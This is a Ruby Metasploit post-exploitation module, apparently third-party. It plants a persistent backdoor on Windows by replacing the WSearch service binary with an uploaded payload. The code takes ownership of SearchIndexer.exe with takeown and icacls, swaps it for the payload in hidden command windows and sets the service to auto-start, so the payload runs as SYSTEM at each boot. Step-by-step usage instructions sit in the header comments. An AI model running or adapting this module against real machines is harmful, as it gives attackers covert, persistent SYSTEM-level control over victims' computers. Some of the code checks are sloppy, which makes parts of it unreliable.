# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# [ persist_priv_Wsearch.rb ]
# $Id$ 1.7 Author: pedr0 Ubuntu aka: [r00t-3xp10it]
# Hosted By: peterubuntu10[at]sourceforge[dot]net
# http://sourceforge.net/projects/msf-auxiliarys/
# https://sourceforge.net/p/msf-auxiliarys/repository/ci/master/tree/persist_priv_Wsearch.rb
#
#
# ---
# [ POST-EXPLOITATION MODULE DESCRIPTION ]
# into WSearch (windows search) service. The WSearch service uses one executable.exe set in binary_path_name
# and runs it has local/system at startup, this enables local privilege_escalation/persistence_backdooring.
# To exploit this vulnerability a local attacker needs to inject/replace the executable file into the binary_path_name
# of the service. &#039;Rebooting the system or restarting the service will run the malicious executable with elevated privileges.
#
#
# [ HOW TO EXPLOIT THE VULNERABILITY ]
# 2º - build new payload called: SearchIndexer.exe (2º payload to send to target)
# 3º - start conrrespondent handler to wait for the 2º payload connection.
# 4º - use post/windows/escalate/persist_priv_Wsearch (set options required) 
# 5º - set UPLOAD_PATH /root/SearchIndexer.exe (2º payload to send to target)
# 6º - exploit
#
#
# [ MODULE OPTIONS ]
# HINT: to unset all values use: msf post(persist_priv_Wsearch) > unset all
# Input The session number to run this module on => set SESSION 3
# Input full path of SearchIndexer.exe to upload => set UPLOAD_PATH /root/shell/output/SearchIndexer.exe
# Check WSearch service auto-start status?       => set SERVICE_STATUS true
# revert WSearch service executable to default?  => set DELETE_PERSISTENCE true
# ---
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/persist_priv_Wsearch.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/persist_priv_Wsearch.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/escalate
#
#
# [ LOAD/USE AUXILIARY ]
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/escalate/persist_priv_Wsearch
# msf post(persist_priv_Wsearch) > info
# msf post(persist_priv_Wsearch) > show options
# msf post(persist_priv_Wsearch) > show advanced options
# msf post(persist_priv_Wsearch) > set [option(s)]
# msf post(persist_priv_Wsearch) > exploit
##



# ----------------------------
# Module Dependencies/requires
# ----------------------------
require &#039;rex&#039;
require &#039;msf/core&#039;
require &#039;msf/core/post/common&#039;
require &#039;msf/core/post/windows/priv&#039;



# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv



# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        &#039;Name&#039;          => &#039;persistence/privilege_escalation in WSearch&#039;,
                        &#039;Description&#039;   => %q{
                        },
                        &#039;License&#039;       => UNKNOWN_LICENSE,
                        &#039;Author&#039;        =>
                                [
                                        &#039;peterubuntu10[at]sourceforge[dot]net&#039;, # post-module author/vuln discover
                                        &#039;Special thanks: milton_barra|Chaitanya Haritash&#039;, # testing/debug module
                                ],
 
                        &#039;Version&#039;        => &#039;$Revision: 1.7&#039;,
                        &#039;DisclosureDate&#039; => &#039;out 27 2016&#039;,
                        &#039;Platform&#039;       => &#039;windows&#039;,
                        &#039;Arch&#039;           => &#039;x86_x64&#039;,
                        &#039;Privileged&#039;     => &#039;false&#039;,
                        &#039;Targets&#039;        =>
                                [
                                         # Tested againts windows 7 (32 bits) | XP SP1 (32 bits)
                                         [ &#039;Windows XP&#039;, &#039;Windows VISTA&#039;, &#039;Windows 7&#039;, &#039;Windows 8&#039;, &#039;Windows 9&#039;, &#039;Windows 10&#039; ]
                                ],
                        &#039;DefaultTarget&#039;  => &#039;3&#039;, # default its to run againts windows 7 (32 bits)
                        &#039;References&#039;     =>
                                [
                                         [ &#039;URL&#039;, &#039;http://goo.gl/OvgbW&#039; ],
                                         [ &#039;URL&#039;, &#039;http://sourceforge.net/users/peterubuntu10&#039; ],
                                         [ &#039;URL&#039;, &#039;http://sourceforge.net/projects/msf-auxiliarys/repository&#039; ],
                                         [ &#039;URL&#039;, &#039;http://computerstepbystep.com/windows_search_service.html&#039; ],
                                         [ &#039;URL&#039;, &#039;http://www.winhelponline.com/blog/take-ownership-of-file-or-folder/&#039; ],
                                         [ &#039;URL&#039;, &#039;https://technet.microsoft.com/en-us/library/cc753525%28v=ws.11%29.aspx&#039; ]



                                ],
			&#039;DefaultOptions&#039; =>
				{
					&#039;SESSION&#039; => &#039;1&#039;, # Default its to run againts session 1
				},
 
                ))
 
                register_options(
                        [
                                OptString.new(&#039;SESSION&#039;, [ true, &#039;The session number to run this module on&#039;]),
                                OptString.new(&#039;UPLOAD_PATH&#039;, [ false, &#039;The full path of your SearchIndexer.exe to be uploaded&#039;]),
                                OptBool.new(&#039;SERVICE_STATUS&#039;, [ false, &#039;Check remote WSearch service settings?&#039; , false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new(&#039;DELETE_PERSISTENCE&#039;, [ false, &#039;revert WSearch service executable to default?&#039; , false])
                        ], self.class)
 
        end




# ----------------------------------------------
# Check for proper target Platform (win32|win64)
# ----------------------------------------------
def unsupported
   session = client
     sys = session.sys.config.sysinfo
       print_warning("[ABORT]: Operative System => #{sys[&#039;OS&#039;]}")
       print_error("Only windows systems are supported by this module...")
       print_error("Please execute [info] for further information...")
       print_line("")
   raise Rex::Script::Completed
end




# ----------------------------------------------------------
# INJECT/UPLOAD OUR EXECUTABLE INTO WSearch BINARY_PATH_NAME
# ----------------------------------------------------------
def ls_stage1

  r=&#039;&#039;
  session = client
  upath = datastore[&#039;UPLOAD_PATH&#039;]
  bin_path = "%systemroot%\\system32\\SearchIndexer.exe"
  # check for proper config settings enter
  if datastore[&#039;UPLOAD_PATH&#039;] == &#039;nil&#039;
    print_error("Options not configurated correctly...")
    print_warning("Please set UPLOAD_PATH option...")
    return nil
  else
    # elevate privs befor running module
    print_status("Persisting your payload in target system.")
    client.sys.config.getprivs.each do |priv|
    end
  end


    # check target system language to define key variable to use in (icacls) syntax...
    check_lang = registry_getvaldata("HKLM\\System\\CurrentControlSet\\Control\\Nls\\Language","InstallLanguage")
    if check_lang == "0816" || check_lang == "0416"
      print_warning("Target System language detected:Portuguese...")
      key = "Administrador"
      elsif check_lang == "0409" || check_lang == "0009" || check_lang == "0809" || check_lang == "0C09" || check_lang == "1009" || check_lang == "0421" || check_lang == "0415"
        print_warning("Target System language detected:English...")
        key = "Administrator"
      elsif check_lang == "0410"
        print_warning("Target System language detected:Italian...")
        key = "Amministratore"
      elsif check_lang == "040C" || check_lang == "0413"
        print_warning("Target System language detected:French...")
        key = "Administrateur"
      elsif check_lang == "0407"
        print_warning("Target System language detected:German...")
        key = "Verwalter"
    else
      print_error("post-module cant define target system language...")
      print_warning("defaulting key to english language [Administrator]")
      key = "Administrator"
    end


    # list of arrays to execute
    arrays = [
       &#039;ren %systemroot%\\system32\\SearchIndexer.exe  SearchIndexer.bk&#039;,
       &#039;move /y %temp%\\SearchIndexer.exe %systemroot%\\system32\\SearchIndexer.exe&#039;,
       &#039;sc start WSearch&#039;
      ]

      print_good("Stoping WSearch remote service...")
      # stop service to enable proper configuration
      r = session.sys.process.execute("cmd.exe /c sc stop WSearch", nil, {&#039;Hidden&#039; => true, &#039;Channelized&#039; => true})
      sleep(2.0)
        print_good("Setting service to auto-start with windows...")
        # set service to auto-start with windows
        r = session.sys.process.execute("cmd.exe /c sc config WSearch start= auto", nil, {&#039;Hidden&#039; => true, &#039;Channelized&#039; => true})
        sleep(2.0)

          # upload our executable into &#039;temp&#039; folder...
          print_good("Uploading payload to target temp folder...")
          client.fs.file.upload("%temp%\\SearchIndexer.exe","#{upath}")

          # takeown of SearchIndexer.exe
          print_good("Takeowner of SearchIndexer to replace it by our executable.")
          print_good(" Execute => takeown /f #{bin_path}")
          r = session.sys.process.execute("cmd.exe /c takeown /f #{bin_path}", nil, {&#039;Hidden&#039; => true, &#039;Channelized&#039; => true})
          sleep(2.0)

          # grant admin permitions (icacls)
          print_good(" Execute => icacls #{bin_path} /grant #{key}:(F)")
          r = session.sys.process.execute("cmd.exe /c icacls #{bin_path} /grant #{key}:(F)", nil, {&#039;Hidden&#039; => true, &#039;Channelized&#039; => true})
          sleep(2.0)

            # loop funtion to manipulate file permitions in target system.
            session.response_timeout=120
            arrays.each do |cmd|
              begin
                # execute cmd prompt in a hidden channelized windows
                r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {&#039;Hidden&#039; => true, &#039;Channelized&#039; => true})
                print_good(" Execute => #{cmd}")
 
                  # close client channel when done
                  while(d = r.channel.read)
                          break if d == ""
                  end
              end
            end

        # task completed successefully...
        print_good("Restarting WSearch service...")
        sleep(2.0)
        print_warning("WSearch service [binary_path_name] backdoored successefuly...")
        print_status("Setup one handler and Wait everytime that system restarts OR")
        print_status("Setup one handler and restart Wsearch service: sc start WSearch")
        print_line("")

    # close channel when done
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# ---------------------------------------------------------
# DELETE/REVERT WSEARCH SERVICE EXECUTABLE TO DEFAULT STAGE
# ---------------------------------------------------------
def ls_stage2

  r=&#039;&#039;
  session = client
  backup = "%systemroot%\\system32\\SearchIndexer.bk"
  # check for proper config settings enter
  if datastore[&#039;DELETE_PERSISTENCE&#039;] == &#039;nil&#039;
    print_error("Options not configurated correctly...")
    print_warning("Please set DELETE_PERSISTENCE option...")
    return nil
  else
    # elevate privs befor running module
    print_status("Revert WSearch service executable to default stage")
    client.sys.config.getprivs.each do |priv|
    end
  end


    # list of arrays to execute
    arrays = [
       &#039;takeown /f %systemroot%\\system32\\SearchIndexer.exe&#039;,
       &#039;ren %systemroot%\\system32\\SearchIndexer.bk SearchIndexer.exe&#039;,
       &#039;sc config WSearch start= demand&#039;,
       &#039;sc start WSearch&#039;
    ]

    # check if backup file exist on target
    if client.fs.file.exist?("#{backup}")
      print_warning("Backup SearchIndexer.bk file:found...")
      print_good("Stoping WSearch remote service...")
      # stop service to enable proper configuration
      r = session.sys.process.execute("cmd.exe /c sc stop WSearch", nil, {&#039;Hidden&#039; => true, &#039;Channelized&#039; => true})
      sleep(2.0)

          # loop funtion to manipulate file permitions in target system.
          print_good("Takeowner of SearchIndexer service executable...")
          session.response_timeout=120
          arrays.each do |cmd|
            begin
              # execute cmd prompt in a hidden channelized windows
              r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {&#039;Hidden&#039; => true, &#039;Channelized&#039; => true})
              print_good(" Execute => #{cmd}")
 
                # close client channel when done
                while(d = r.channel.read)
                        break if d == ""
                end
            end
          end


        print_good("Restarting WSearch service...")
        sleep(2.0)
        print_warning("WSearch service executable reverted to default stage...")
        print_status("we have lost our backdoor :( but feeded the white hacker within :D")
        print_line("")

      # close channel when done
      r.channel.close
      r.close

    else
      print_error("Backupfile: SearchIndexer.bk => NOT FOUND...")
      print_warning("post-module did not have reverted the service default executable.")
      print_line("")
    end


  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# ------------------------------------
# CHECK/DISPLAY WSEARCH SERVICE STATUS
# ------------------------------------
def ls_stage3

  r=&#039;&#039;
  serv="WSearch"
  session = client
  sysnfo = session.sys.config.sysinfo
  # check for proper config settings enter
  if datastore[&#039;SERVICE_STATUS&#039;] == &#039;nil&#039;
    print_error("Options not configurated correctly...")
    print_warning("Please set SERVICE_STATUS option...")
    return nil
  else
    print_status("Checking WSearch service settings...")
    sleep(2.0)
  end


    print_warning("Reading service hive registry keys...")
    # search in target regedit for WSearch auto-start service status
    # Value:Start - dword: 2 - auto | 3 - manual | 4 - disabled
    if registry_getvaldata("HKLM\\System\\CurrentControlSet\\services\\WSearch", "Start") == 2
      startup = "auto_start"
    end
    if registry_getvaldata("HKLM\\System\\CurrentControlSet\\services\\WSearch", "Start") == 3
      startup = "manual_start"
    end
    if registry_getvaldata("HKLM\\System\\CurrentControlSet\\services\\WSearch", "Start") == 4
      startup = "disabled_start"
    else
        startup = "unknow"
        print_error("post-module cant define service auto_start status...")
        print_warning("enter into a shell session and execute: sc qc WSearch status") 
    end


      sleep(1.0)
      # display WSearch service current settings.
      print_line("")
      print_line("    :host    => #{sysnfo[&#039;Computer&#039;]}")
      print_line("    :service => #{serv}")
      print_line("    :status  => running")
      print_line("    :startup => #{startup}")
      print_line("")

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client
    # Check for proper target Platform
    unsupported if client.platform !~ /win32|win64/i

      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("    +---------------------------------------------+")
    print_line("    | PERSISTENCE + PRIV_ESCAL IN WSEARCH SERVICE |")
    print_line("    |    Author: Pedro Ubuntu [ r00t-3xp10it ]    |")
    print_line("    +---------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore[&#039;SESSION&#039;]}")
    print_line("    Computer            : #{sysnfo[&#039;Computer&#039;]}")
    print_line("    Operative System    : #{sysnfo[&#039;OS&#039;]}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


 
# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore[&#039;UPLOAD_PATH&#039;]
         ls_stage1
      end

      if datastore[&#039;DELETE_PERSISTENCE&#039;]
         ls_stage2
      end

      if datastore[&#039;SERVICE_STATUS&#039;]
         ls_stage3
      end
   end
end

